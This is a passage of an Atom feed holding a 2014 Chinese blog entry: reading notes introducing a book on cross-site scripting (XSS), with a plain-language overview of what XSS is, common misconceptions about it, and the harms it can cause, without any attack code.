      <category term="读书笔记" scheme="http://www.m4ster.net/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[《XSS跨站脚本攻击剖析与防御》学习笔记（前言）]]></title>
    <link href="http://www.m4ster.net/2014/12/25/%E3%80%8AXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%89%8D%E8%A8%80%EF%BC%89/"/>
    <id>http://www.m4ster.net/2014/12/25/《XSS跨站脚本攻击剖析与防御》学习笔记（前言）/</id>
    <published>2014-12-25T06:32:28.000Z</published>
    <updated>2014-12-25T09:41:50.000Z</updated>
    <content type="html"><![CDATA[<h2 id="前言">前言</h2>
<p>近来在学习《XSS跨站脚本攻击剖析与防御》这本书，此书从XSS的基础攻击原理、危害以及一些常用的利用/防御的技巧再到高级利用方式衍生到Web 2.0的最大威胁——跨站脚本蠕虫，由浅入深的阐释了XSS对于网络安全意味着什么。在这里和大家分享下我的学习心得和知识的总结。</p>
<h3 id="XSS是什么">XSS是什么</h3>
<p>XSS（<code>Cross-site Scripting</code>）跨站脚本攻击，XSS作为最常见的计算机安全漏洞，在世界各地的网站上疯狂肆虐，即使最知名的网站也曾遭受过XSS漏洞攻击。</p>
<h3 id="XSS给大部分人留下的印象">XSS给大部分人留下的印象</h3>
<p>由于XSS属于被动式攻击，且不易利用，所以一直不被重视。</p>
<ul>
<li>XSS？反正XSS又不能直接获取我的root权限。</li>
<li>跨站脚本是在客户端运行的，对我的网站没有危害。</li>
<li>XSS等同于鸡肋漏洞。</li>
<li>……</li>
</ul>
<h3 id="XSS的危害">XSS的危害</h3>
<ul>
<li>可以用来劫持浏览器用户的会话</li>
<li>劫持客户端cookies、网络钓鱼</li>
<li>让受害用户对服务器产生大量请求，形同对服务器的分布式拒绝服务攻击（<code>DDos</code>）</li>
<li>……</li>
</ul>
<h3 id="XSS对于安全研究者来说">XSS对于安全研究者来说</h3>
<ul>
<li>攻击方式众多，灵活多变</li>
<li>对于现在的社交网络，甚至可以衍生出蠕虫般的自我复制能力</li>
<li>……</li>
</ul>
<h2 id="总结">总结</h2>
<p>XSS攻击对于Web 2.0时代是不容忽视的安全威胁。作为安全研究者，必须要重视。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="前言">前言</h2>
<p>近来在学习《XSS跨站脚本攻击剖析与防御》这本书，此书从XSS的基础攻击原理、危害以及一些常用的利用/防御的技巧再到高级利用方式衍生到Web 2.0的最大威胁——跨站脚本蠕虫，由浅入深的阐释了XSS对于网络安全意味着什么。在这里和大家]]>
    </summary>
    
      <category term="XSS" scheme="http://www.m4ster.net/tags/XSS/"/>
    
      <category term="跨站攻击" scheme="http://www.m4ster.net/tags/%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/"/>
    
      <category term="读书笔记" scheme="http://www.m4ster.net/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
</feed>
